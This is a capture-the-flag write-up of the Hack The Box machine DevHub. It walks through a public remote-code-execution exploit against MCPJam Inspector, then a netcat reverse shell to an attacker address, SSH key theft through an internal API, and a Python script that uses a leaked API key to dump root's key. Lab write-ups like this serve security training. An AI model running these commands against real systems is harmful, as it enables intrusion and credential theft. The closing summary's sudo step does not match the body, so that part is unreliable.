
# DevHub - Hack The Box (Medium)

# DevHub

## Machine Information

- **Platform:** Hack The Box
- **Difficulty:** Medium
- **OS:** Linux
- **Status:** Owned

---

# Enumeration

## Nmap

Initial scan:

```bash
nmap -p- -sC -sV -Pn <TARGET_IP> -oN nmap
```
![image alt](https://github.com/Eliaspaz2/HTB-Writeups/blob/e78f425ce7adafb9afd0be0c0d3cf803bd42ef9b/Medium/Devhub/01-nmap-devhub.png)

Interesting ports discovered:

| Port | Service |
|------|----------|
| 22 | SSH |
| 80 | HTTP |
| 6274 (MCPJam Inspector) | Web Management Console |

AI testing software called MCPJam Inspector

---

# Version Enumeration

Navigating through the administration interface exposed the software version.

Searching public exploits revealed that this version was vulnerable to a publicly available Remote Code Execution vulnerability.

While researching this vulnerability, I found that with an HTTP request specifically designed for the API Endpoint /api/mcp/connect, commands could be executed on the server

---

# Initial Access

A public Python exploit was used against the vulnerable instance.

```bash
git clone https://github.com/daemoncibsec/mcpExec.git
cd mcpExec
python3 -m venv venv
source venv/bin/activate
pip install rich
pip install argparse
pip install requests
chmod +x mcpExec.py
```

After starting a listener:

```bash
nc -lvnp 4444
```

The exploit was executed:

```bash
python3 mcpExec.py http://devhub.htb:6274 10.10.14.155 4444

```

The exploit successfully returned a reverse shell.

---

# Shell Stabilization

The initial shell was upgraded.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```
CTRL + Z
```

On Kali:

```bash
stty raw -echo
fg
reset
```

Then:

```bash
export TERM=xterm
stty rows 50 columns 150
```

---

# Local Enumeration

Performed standard enumeration:

```bash
id
hostname
sudo -l
find / -perm -4000 -type f 2>/dev/null
ss -tulpn
ps aux
```

Nothing immediately exploitable appeared.

Further manual enumeration identified another local user:

```
analyst
```

---

# Lateral Movement

The local machine exposed an internal API used by the analyst account.

After reviewing the functionality of that API, it became possible to retrieve the analyst user's SSH private key.

Once the private key was obtained:

```bash
chmod 600 analyst_id_rsa
```

SSH access:

```bash
ssh -i analyst_id_rsa analyst@<TARGET_IP>
```

Successfully authenticated as:

```
analyst
```

---

# Privilege Escalation

While enumerating the system as the **analyst** user, I listed the running processes:

```bash
ps aux | grep jupyter
```

Among the running services, a **root-owned Jupyter-related process** caught my attention. Reviewing the associated `server.py` file revealed that it implemented an internal API listening on port **5000**.

The source code also exposed an API key:


```text
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

To interact with the API from my attacker machine, I created an SSH local port forward:

```bash
ssh -L 5000:localhost:5000 analyst@<TARGET_IP>
```

Reviewing the API endpoints showed an administrative function capable of dumping sensitive system information. In particular, the `ops._admin_dump` action could retrieve the stored SSH keys.

I wrote a simple Python script that authenticated using the leaked API key and requested the root SSH key:

```python
import requests

url = "http://localhost:5000/tools/call"

headers = {
    "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
}

payload = {
    "name": "ops._admin_dump",
    "arguments": {
        "target": "ssh_keys",
        "confirm": True
    }
}

r = requests.post(url, headers=headers, json=payload)
print(r.text)
```

The response contained the **root private SSH key**.

I saved it locally:

```bash
echo -e "<PRIVATE_KEY>" > root_privkey
chmod 600 root_privkey
```

Then authenticated directly as root:

```bash
ssh -i root_privkey root@<TARGET_IP>
```

Successful authentication granted a root shell.

![image alt](https://github.com/Eliaspaz2/HTB-Writeups/blob/dd3ecd3a20329e9b3359b8e3d1032f3ca53dfa88/Medium/Devhub/03-root_gain-devhub.png)

Verification:

```bash
id
```

Output:

```
uid=0(root)
```
---

# Flags

User:

```text
abe941c3a608ababbfde07c726d0abba
```

Root:

```text
872305e1139c1a43c6c73f91825b013f
```

---

# Lessons Learned

## Enumeration

- Always inspect management dashboards.
- Product versions often directly reveal public CVEs.

## Initial Access

- Public exploits should always be validated manually.
- Reverse shell exploits frequently require only minor modifications.

## Local Enumeration

- Even if privilege escalation is not immediately possible, enumerate every user.
- Internal services often become attack vectors after initial compromise.

## Lateral Movement

- Internal APIs can expose sensitive credentials.
- SSH keys are frequently easier to abuse than passwords.

## Privilege Escalation

- Always inspect sudo permissions carefully.
- Custom Python applications executed as root deserve thorough review.

---

# Tools Used

- Nmap
- Netcat
- Python
- SSH
- MCPJam Inspector Public Exploit
- LinPEAS (optional)
- Manual Enumeration

---

# Attack Chain

```
Nmap
        ↓
MCPJam Inspector Version Enumeration
        ↓
Public CVE
        ↓
Python Exploit
        ↓
Reverse Shell
        ↓
Shell Stabilization
        ↓
Internal Enumeration
        ↓
API Abuse
        ↓
Extract Analyst SSH Key
        ↓
SSH as analyst
        ↓
Abuse sudo Python Program
        ↓
Root
```

# Notes

This machine focused heavily on:

- Proper service enumeration
- Version identification
- Exploit validation
- Internal API abuse
- Lateral movement
- Privilege escalation through misconfigured sudo permissions

The most valuable lesson from this machine was understanding that obtaining an initial shell is often only the beginning. Careful enumeration of internal services and users ultimately led to full compromise.
